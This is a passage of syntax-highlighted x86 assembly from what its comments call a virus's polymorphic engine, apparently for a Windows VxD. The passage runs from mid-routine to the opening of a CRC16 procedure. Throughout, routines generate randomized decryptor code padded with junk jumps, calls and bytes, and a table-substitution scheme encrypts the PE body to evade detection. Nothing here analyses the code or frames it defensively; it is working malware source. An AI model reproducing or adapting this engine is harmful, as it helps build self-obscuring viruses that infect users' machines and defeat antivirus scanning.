         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">850fh</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lstart</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;386+ jne</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">stosd</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00010000b</span><span class="sc0">                </span><span class="sc1">;set esp as used</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tblstrt</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;calculate start of code</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pmdptr</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;to decript(delta-based)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                          </span><span class="sc1">;exit with correct regs</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">inc_pointer</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">;inc</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dpointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">dec_counter</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                          </span><span class="sc1">;dec</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mcounter</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                         </span><span class="sc1">;mov</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">totsize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">stosd</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mpointer</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">stosd</span><span class="sc0">                                 </span><span class="sc1">;do call</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tblstrt</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">crptbl</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">;zopy table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">                          </span><span class="sc1">;do pop</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tpointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mdpointer</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                         </span><span class="sc1">;mov</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dpointer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pmdptr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">stosd</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">gar</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                              </span><span class="sc1">;get any reg</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">;sp never</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">gar</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get32_16reg</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;get a free 32/16bit reg</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gar</span><span class="sc0">
         </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">get32_16reg</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get8reg</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;get a free 8bit reg</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                              </span><span class="sc1">;al,cl,dl,bl</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0011b</span><span class="sc0">
         </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reg32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">get8reg</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ntg</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100b</span><span class="sc0">                          </span><span class="sc1">;ah,ch,dh,bh</span><span class="sc0">
  </span><span class="sc5">ntg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">garble32</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rlevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maxr</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rlevel</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">ng32</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01111b</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">gtbl</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">ng32</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rlevel</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">maxr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">              </span><span class="sc1">;change stack copy of edi</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">gtbl</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">subr</span><span class="sc0">                      </span><span class="sc1">;silly garblers :(</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">subr</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">jmps</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">jmps</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">jmps</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">jmps</span><span class="sc0">                      </span><span class="sc1">;no time to code good ones...</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">jcc</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">jcc</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">jcc</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">jcc</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">calls</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">calls</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">calls</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">calls</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">calls</span><span class="sc0">
         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">calls</span><span class="sc0">

</span><span class="sc5">jcc</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                              </span><span class="sc1">;do jump conditional with</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">                          </span><span class="sc1">;real displacement(no shitty</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f80h</span><span class="sc0">                         </span><span class="sc1">;$+2 thingie)</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">
         </span><span class="sc6">stosd</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">jmps</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">                          </span><span class="sc1">;do jump</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">stosd</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">njnk</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                              </span><span class="sc1">;fill with junk</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">njnk</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">subr</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;make call to subroutine</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">subad</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ncall</span><span class="sc0">                              </span><span class="sc1">;a subroutine was coded?</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">subad</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;calc subr address</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">stosd</span><span class="sc0">
  </span><span class="sc5">ncall</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">calls</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">subad</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;make subroutine</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ncall</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">                          </span><span class="sc1">;the old thing...</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">stosd</span><span class="sc0">                                 </span><span class="sc1">;jump @@1</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">;@@2:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble32</span><span class="sc0">                         </span><span class="sc1">;*garbage*</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc0">                          </span><span class="sc1">;*garbage*</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">                                 </span><span class="sc1">;ret</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                               </span><span class="sc1">;@@1:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">subad</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;store sub address</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rnd255</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011111111b</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">encript_pe</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">totsize</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;our poly engine isnt a</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">crptbl</span><span class="sc0">              </span><span class="sc1">;cyclical decriptor using</span><span class="sc0">
  </span><span class="sc5">ecrt</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;xor/add/sub or like...</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                              </span><span class="sc1">;we use a substitution scheme,</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">;based in a table... This way,</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                         </span><span class="sc1">;'A'=='2' '#'=='x' and so...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                          </span><span class="sc1">;no virus i know use this</span><span class="sc0">
         </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                          </span><span class="sc1">;eax hold offset into table</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">ecrt</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">;setup edi copy in stack</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">subad</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">rlevel</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">tmp</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">tmp2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">tpointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dpointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">counter</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pmdptr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">tblstrt</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">lstart</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reg32</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">totsize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">CRC16</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
